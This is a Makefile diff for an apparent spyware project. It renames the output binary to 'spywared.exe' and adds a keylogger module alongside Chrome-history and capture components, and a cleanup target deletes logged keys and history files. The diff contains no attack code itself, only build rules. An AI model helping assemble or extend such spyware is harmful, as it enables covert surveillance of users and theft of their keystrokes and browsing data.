@@ -3,9 +3,11 @@ CXXFLAGS = -Wall -Wextra -pedantic -std=c++17
 #klog.exe: main.o write.o chrome.o capt.o sqlite3.o
 #	g++ $(CXXFLAGS) main.o write.o chrome.o sqlite3.o -o klog.exe
 
-klog.exe: main.o write.o chrome.o capt.o sqlite3.o
-	g++ $(CXXFLAGS) main.o write.o chrome.o sqlite3.o -o klog.exe
+spywared.exe: main.o write.o chrome.o capt.o sqlite3.o
+	g++ $(CXXFLAGS) main.o write.o klog.o chrome.o sqlite3.o -o spywared.exe
 
+klog.o: klog.cpp klog.h
+	g++ $(CXXFLAGS) -c klog.cpp
 
 chrome.o: chrome.cpp chrome.h
 	g++ $(CXXFLAGS) -c chrome.cpp
@@ -23,7 +25,7 @@ sqlite3.o: sqlite/sqlite3.c sqlite/sqlite3.h
 	gcc -c sqlite/sqlite3.c
 
 clean: 
-	rm -f capt.o main.o chrome.o write.o sqlite3.o klog.exe
+	rm -f capt.o main.o chrome.o write.o klog.o sqlite3.o spywared.exe
 
 dellogs:
 	rm -f keys.txt history.txt
